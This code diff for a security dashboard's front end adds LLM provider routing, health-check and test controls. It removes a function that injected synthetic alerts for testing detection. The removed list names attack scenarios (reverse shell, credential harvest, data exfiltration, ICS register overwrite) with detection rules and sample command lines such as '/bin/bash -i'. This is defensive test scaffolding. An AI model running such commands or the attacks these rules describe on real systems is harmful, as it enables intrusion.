+            const [control, comparison, healthSummary, routing, risk, usageToday, usageWeek] = await Promise.all([
+                api.getLLMControl(probe),
+                api.getLLMProviderComparison(),
+                api.getLLMProviderHealthSummary(),
+                api.getLLMRoutingStrategy(),
+                api.getLLMPredictiveRisk(),
+                api.getLLMUsage('today'),
+                api.getLLMUsage('week'),
+            ]);
+            this.lastData.llmControl = control;
+            this.lastData.llmComparison = comparison;
+            this.lastData.llmHealthSummary = healthSummary;
+            this.lastData.llmRouting = routing;
+            this.lastData.llmRisk = risk;
+            this.lastData.llmUsage = usageToday;
+            this.lastData.llmUsageWeek = usageWeek;
+            
+            render.llmControl(control||{}, comparison, healthSummary, usageToday, usageWeek);
+            render.llmUsageCompare(null, control, comparison);
+            render.llmRouting(routing, risk);
+            
+            if (probe) {
+                this.setNotice('Provider health check complete', 'info', 2000);
+            }
+        });
+    },
+    
+    onRoutingModeChange() {
+        const mode = $('llmRoutingMode')?.value;
+        const helpEl = $('routingModeHelp');
+        const costGroup = $('costCeilingGroup');
+        const abGroup = $('abTestGroup');
+        
+        const helps = {
+            priority: 'Use failover chain order. If a provider fails, automatically switch to the next healthy provider.',
+            cost_optimized: 'Always route to the cheapest available provider within your cost ceiling.',
+            severity_adaptive: 'Use premium providers for critical alerts (severity 8+), cost-optimized for others.',
+            ab_test: 'Split traffic between two providers for comparison testing.'
+        };
+        
+        if (helpEl) helpEl.textContent = helps[mode] || helps.priority;
+        if (costGroup) costGroup.style.display = mode === 'cost_optimized' ? 'block' : 'none';
+        if (abGroup) abGroup.style.display = mode === 'ab_test' ? 'block' : 'none';
+    },
+    
+    async applyForcedProvider() {
+        const provider = $('forceProviderSelect')?.value || '';
+        const res = await api.forceProviderByName(provider || 'auto');
+        if (res) {
+            this.setNotice(provider ? `Forced provider: ${provider.toUpperCase()}` : 'Automatic failover enabled', 'info');
+            await this.refreshLLMControl(false);
+        }
+    },
+    
+    async runLLMTest() {
+        const provider = $('llmTestProvider')?.value || '';
+        const prompt = $('llmTestPrompt')?.value || 'Test prompt';
+        const resultEl = $('llmTestResult');
+        const statusEl = $('llmTestResultStatus');
+        const metaEl = $('llmTestResultMeta');
+        const contentEl = $('llmTestResultContent');
+        
+        if (resultEl) resultEl.style.display = 'block';
+        if (statusEl) statusEl.innerHTML = '<i class="fas fa-spinner fa-spin mr-1"></i> Testing...';
+        if (contentEl) contentEl.textContent = 'Sending request to provider...';
+        
+        try {
+            const res = provider ? await api.testProviderByName(provider, prompt) : await api.testProvider(null, prompt);
+            if (res?.status === 'success') {
+                if (statusEl) statusEl.innerHTML = '<span style="color:#4ade80;"><i class="fas fa-check-circle mr-1"></i>Success</span>';
+                if (metaEl) metaEl.textContent = `${res.provider?.toUpperCase() || 'Unknown'} · ${res.latency_ms}ms · ${res.tokens || 0} tokens · $${Number(res.estimated_cost_usd || 0).toFixed(4)}`;
+                if (contentEl) contentEl.textContent = res.summary || res.response || 'No response content';
+            } else {
+                if (statusEl) statusEl.innerHTML = '<span style="color:#f87171;"><i class="fas fa-times-circle mr-1"></i>Failed</span>';
+                if (metaEl) metaEl.textContent = res?.provider?.toUpperCase() || 'Unknown';
+                if (contentEl) contentEl.textContent = res?.error || res?.message || 'Unknown error';
+            }
+        } catch (e) {
+            if (statusEl) statusEl.innerHTML = '<span style="color:#f87171;"><i class="fas fa-times-circle mr-1"></i>Error</span>';
+            if (contentEl) contentEl.textContent = String(e.message || e);
+        }
+    },
+    
+    async runLLMTestAll() {
+        this.setNotice('Testing all providers...', 'info');
+        await this.runLLMTest();
+    },
+    
+    async applyRoutingStrategy() {
+        const payload = {
+            mode: $('llmRoutingMode')?.value || null,
+            cost_ceiling_usd: Number($('llmRoutingCost')?.value || 0) || null,
+        };
+        const res = await api.setLLMRoutingStrategy(payload);
+        if (res?.status === 'ok') {
+            this.setNotice('Routing strategy updated', 'info');
+            await this.refreshLLMControl(false);
+        } else {
+            this.setNotice('Failed to update routing strategy', 'error');
+        }
+    },
+    
+    async testProviderKey(provider) {
+        this.setNotice(`Testing ${provider} API key...`, 'info');
+        await this.runLLMTest();
+    },
+    
+    async probeProvider(provider) {
+        this.setNotice(`Probing ${provider}...`, 'info');
+        await this.refreshLLMControl(true);
+    },
+    
+    async retryAllProviders() {
+        this.setNotice('Resetting all providers...', 'info');
+        await this.refreshLLMControl(false);
+    },
+    
+    clearLLMEvents() {
+        const log = $('llmEventLog');
+        if (log) log.innerHTML = '<span style="color:#606080;">// Events cleared</span>';
     },
 
     async refreshAll() {
@@ -671,6 +1520,7 @@ const app = {
         else if(tab==='alerts')     this.renderAlerts();
         else if(tab==='iot')        render.iot(d.iot||{});
         else if(tab==='kubernetes') render.kubernetes(d);
+        else if(tab==='governance') render.governance(d.gov, d.govPending);
     },
 
     renderAlerts() {
@@ -682,43 +1532,7 @@ const app = {
         if (this.currentTab==='overview'||this.currentTab==='alerts') setTimeout(()=>this.refreshAll(),1500);
     },
 
-    async launchAttack(id) {
-        const ATTACKS=[
-            {id:0, name:'ONVIF Camera DDoS',          source:'suricata',pod:'traffic-camera',    sev:9,  mitre:'T0866',rule:'Suricata ET DOS Inbound Network Flood'},
-            {id:1, name:'MQTT Broker Flood',            source:'suricata',pod:'mqtt-broker',        sev:7,  mitre:'T0814',rule:'ET DOS Numerous MQTT CONNECTs from single IP'},
-            {id:2, name:'Reverse Shell – Healthcare',   source:'falco',   pod:'healthcare-api',     sev:8,  mitre:'T0807',rule:'Terminal shell in container'},
-            {id:3, name:'Cryptominer in Camera Pod',    source:'falco',   pod:'traffic-camera',     sev:8,  mitre:'T0871',rule:'Crypto Currency Mining Activity Detected'},
-            {id:4, name:'Modbus Register Overwrite',   source:'falco',   pod:'env-sensor',          sev:9,  mitre:'T0836',rule:'Unexpected Modbus Write Command on ICS Bus'},
-            {id:5, name:'DALI-2 Lighting Blackout',    source:'falco',   pod:'street-lighting',     sev:9,  mitre:'T0879',rule:'Abnormal DALI Gateway Command Burst'},
-            {id:6, name:'FHIR Patient Record Tamper',  source:'falco',   pod:'healthcare-api',      sev:10, mitre:'T0831',rule:'FHIR High-Frequency PUT — Patient Record Tampering'},
-            {id:7, name:'ANPR Plate Data Exfil',       source:'suricata',pod:'traffic-camera',     sev:8,  mitre:'T0867',rule:'ET DNS Anomalous Query Volume — Data Exfil'},
-            {id:8, name:'Container Escape via /proc',  source:'falco',   pod:'parking-system',     sev:9,  mitre:'T0890',rule:'Container Escape via nsenter detected'},
-            {id:9, name:'MQTT→OPC UA Pivot',           source:'suricata',pod:'env-sensor',          sev:8,  mitre:'T0843',rule:'Cross-Protocol ICS Lateral Movement'},
-            {id:10,name:'Service Mesh Recon Scan',     source:'suricata',pod:'parking-system',     sev:6,  mitre:'T0846',rule:'ET SCAN Nmap Scripting Engine User-Agent'},
-            {id:11,name:'K8s API Credential Harvest',  source:'falco',   pod:'parking-system',     sev:8,  mitre:'T0552',rule:'K8s serviceaccount token read from container'}
-        ];
-        const sc=ATTACKS.find(a=>a.id===id); if(!sc) return;
-        this.atkRuns++;
-        const runEl=$('atkRunCount'); if(runEl) runEl.textContent=this.atkRuns;
-        const log=$('attackLog');
-        const ts=new Date().toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
-        if(log){log.textContent+=`\n[${ts}] INJECT  ${sc.name}  (${sc.mitre})  →  pod: ${sc.pod}\n`;log.scrollTop=log.scrollHeight;}
-        const payload={output:`${sc.source.toUpperCase()}: ${sc.name} detected on ${sc.pod}`,priority:sc.sev>=8?'Critical':sc.sev>=6?'Warning':'Notice',rule:sc.rule,time:new Date().toISOString(),output_fields:{'container.name':sc.pod,'mitre.technique':sc.mitre,'proc.cmdline':sc.source==='falco'?'/bin/bash -i':'nmap -sS'}};
-        try {
-            const res=await api.injectAlert(payload);
-            const sev=res?.severity??'?'; const actions=(res?.actions_taken||[]).join(', ')||'none';
-            if(log){
-                if(res?.error){log.textContent+=`[${ts}] ERROR: ${res.error}\n`;}
-                else{log.textContent+=`[${ts}] OK  trace:${res?.trace_id||'N/A'}  LLM-severity:${sev}/10  actions:${actions}\n`;}
-                log.scrollTop=log.scrollHeight;
-            }
-            const se=$('atkLastSev'); if(se) se.textContent=sev+'/10';
-            const ae=$('atkLastAction'); if(ae) ae.textContent=actions||'logged';
-            setTimeout(()=>this.refreshAll(),2000);
-        } catch(e) {
-            if(log){log.textContent+=`[${ts}] ERROR: ${e.message}\n`;log.scrollTop=log.scrollHeight;}
-        }
-    }
+    // Synthetic attack launchers removed (live attacks only).
 };
 
 // ── Bootstrap ─────────────────────────────────────────────────────────
